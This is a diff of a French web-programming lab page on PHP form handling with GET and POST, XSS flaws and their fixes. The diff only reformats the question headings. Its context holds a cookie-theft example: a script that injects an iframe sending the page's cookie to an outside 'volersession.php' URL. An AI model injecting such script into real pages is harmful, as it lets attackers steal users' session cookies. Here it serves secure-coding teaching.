@@ -575,8 +575,8 @@ scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1
 </source></code></pre>
 					</details>
 					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9314;</small> &emsp; GET : &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
-					&emsp;Ajouter dans le formulaire<br>
+					
+					<b class="greenNum">&#9315;</b> Ajouter dans le formulaire<br>
 					<ul type="disc" class="questions_" >
                          <li >4.1 Un champs <b>puniton</b>(string)</li>
                          <li >4.2 Un champs <b>nbFois</b>(int): 10 par défaut</li>
@@ -652,8 +652,8 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					</div>
 					</details>
 					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9315;</small> &emsp; POST: &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
-					&emsp;Dupliquer <b>form.php</b> en <b>form.1.php</b><br>
+					
+					<b class="greenNum">&#9316;</b> Dupliquer <b>form.php</b> en <b>form.1.php</b><br>
 					<ul type="disc" class="questions_" >
                          <li>Dans <b>form.php</b>: Remplacer <b>GET</b> par <b>POST</b> </li>					
 						 <li>Qu'est-ce qui change ?</li>						 
@@ -666,11 +666,9 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 						 </div>
 					</details>
 					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9316;</small> &emsp; Failles XSS &emsp; <i style="color:#115;">Injection de code</i> </b></span><br>
-					&emsp;<b style="line-height:1.5em">Vulnérabilté  du fichier traitement</b>(corps.php)<p></p>
-					&emsp;Il peut être appelé par n'importe quelle page( pas seulement form.php)
 					
-					
+					<b class="greenNum">&#9317;</b> <b>Vulnérabilté  du fichier traitement</b>(corps.php)<br>
+					<span style="line-height:2em"> &emsp;&nbsp;&nbsp; Il peut être appelé par n'importe quelle page( pas seulement form.php)</span>
 					<ul type="disc" class="questions_" >
 					     <li>Quelle conséquence ?! </li>
 						 <li>Et si on met du code HTML dans le champs <b>nom</b> !</li>
@@ -685,7 +683,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 							   <li><b>Injection javaScript</b>: Voler le cookie contenant les paramètres de connexion( en utilisant une rédirection javaScript)</li>
 							</ul>							
 						 </div>
-						 <span class="idS subQuestion t-transparent" style="margin-top:0 !important;; background:#d2f2df !important;">&nbsp;&nbsp;Exemple de vol de cookie par injection javaScript</span>
+						 <span class="idS subQuestion t-transparent" style="margin-top:0 !important;">&nbsp;&nbsp;Exemple de vol de cookie par injection javaScript</span>
 <pre><code class="language-html" ><source lang="html">
 &lt;script>
      document.write('&lt;iframe src="https://www.lije-creative.com/volersession.php?'+ 
@@ -694,8 +692,8 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 </source></code></pre>
 					</details>
 					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9317;</small> &emsp; Fonctions &emsp; <i style="color:#115;"><b>html<span style="color:#990033">special</span>chars()</b>,&emsp; <b><span style="color:#990033">strip_tags()</span></b></i> </b></span><br>
-					&emsp;Comment résoudre le problème précédent ?<br>
+					
+					<b class="greenNum">&#9318;</b> Comment résoudre le problème précédent ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
 					    <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
